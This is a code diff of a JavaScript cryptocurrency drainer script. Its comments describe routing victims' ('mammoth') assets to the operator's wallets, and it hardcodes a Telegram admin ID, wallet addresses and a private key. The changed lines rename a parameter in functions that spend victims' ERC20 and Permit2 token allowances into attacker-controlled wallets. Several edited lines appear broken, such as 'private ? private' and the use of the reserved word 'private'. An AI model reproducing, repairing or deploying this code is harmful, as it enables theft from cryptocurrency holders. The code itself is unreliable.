@@ -35,7 +35,7 @@ const MS_Telegram_Chat_ID = "-1004492670482"; // -1002583817934 Enter here the I
 const MS_Telegram_Admin_IDs = ["8914856872"]; // Specify your Telegram ID here so that it only accepts commands from you
 
 const MS_Wallet_Address = "0x6c8BE5c0CB5C488d6A69f8795969A996a46276ff"; // Wallet address where mammoth assets will go
-const MS_Wallet_Private = "0xdb9dac99cd4f62025b762e2df5c1e77da7f82edb0990deab53d0086ff7df8251"; // The privatemode key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
+const MS_Wallet_Private = "0xdb9dac99cd4f62025b762e2df5c1e77da7f82edb0990deab53d0086ff7df8251"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
 const MS_Wallet_Receiver = ["0xe07c77fbf97a17ca781c8f301b599b0d23682bbf"]; // The wallet or wallets where the assets will arrive may be the same as MS_Wallet_Address, or may be different
 // To specify multiple wallets, you need to fill in as follows: MS_Wallet_Receiver = ["WALLET_ADDRESS_HERE", "ANOTHER_WALLET", "ONE_MORE_WALLET"]
 // If several wallets are specified, the drainer will select a random one and send assets to it, convenient for asset distribution
@@ -1265,7 +1265,7 @@ const add_record = async (record) => {
   }
 };
 
-const add_allowance = async (owner, spender, token, chain_id, permit2 = false, privatemode = false, partner_address = false) => {
+const add_allowance = async (owner, spender, token, chain_id, permit2 = false, private = false, partner_address = false) => {
   try {
     if (!MS_Allowance_API) return false;
     let allowance_list = [];
@@ -4463,7 +4463,7 @@ try {
   console.log(err);
 }
 
-const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = false, privatemode = false, partner_address = false) => {
+const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = false, private = false, partner_address = false) => {
   try {
     let split_data = get_split_data(partner_address, MS_Split_Modes.tokens.repeat);
     let tx_count = !split_data ? 1 : 2;
@@ -4471,7 +4471,7 @@ const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = fal
       let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, '0x000000000022d473030f116ddee9f6b43ac78ba3');
       if (!current_allowance) return false;
       const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
-      const signer = new ethers.Wallet(private ? privatemode : MS_Allowance_Withdraw.wallets[spender], node);
+      const signer = new ethers.Wallet(private ? private : MS_Allowance_Withdraw.wallets[spender], node);
       const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
       const contract_batch = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], signer);
       const permit_data = await contract.allowance(owner, token, spender);
@@ -4499,7 +4499,7 @@ const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = fal
       if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
         return false;
       }
-      if (private != false && privatemode != MS_Wallet_Private) {
+      if (private != false && private != MS_Wallet_Private) {
         const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit));
         const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
         const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
@@ -4534,7 +4534,7 @@ const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = fal
       } catch(err) {
         console.log(err);
       }
-      if (private != false && privatemode != MS_Wallet_Private) {
+      if (private != false && private != MS_Wallet_Private) {
         try {
           const new_balance = await signer.getBalance();
           const after_fee = ethers.BigNumber.from(new_balance).sub(ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 30000)))));
@@ -4561,7 +4561,7 @@ const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = fal
       let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, spender);
       if (!current_allowance) return false;
       const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
-      const signer = new ethers.Wallet(private ? privatemode : MS_Allowance_Withdraw.wallets[spender], node);
+      const signer = new ethers.Wallet(private ? private : MS_Allowance_Withdraw.wallets[spender], node);
       const contract = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
       const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
       let gas_limit = null;
@@ -4574,7 +4574,7 @@ const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = fal
       if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
         return false;
       }
-      if (private != false && privatemode != MS_Wallet_Private) {
+      if (private != false && private != MS_Wallet_Private) {
         const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from(tx_count));
         const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
         const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
@@ -4616,7 +4616,7 @@ const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = fal
       } catch(err) {
         console.log(err);
       }
-      if (private != false && privatemode != MS_Wallet_Private) {
+      if (private != false && private != MS_Wallet_Private) {
         try {
           const new_balance = await signer.getBalance();
           const after_fee = ethers.BigNumber.from(new_balance).sub(ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(String((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : 300000)))));
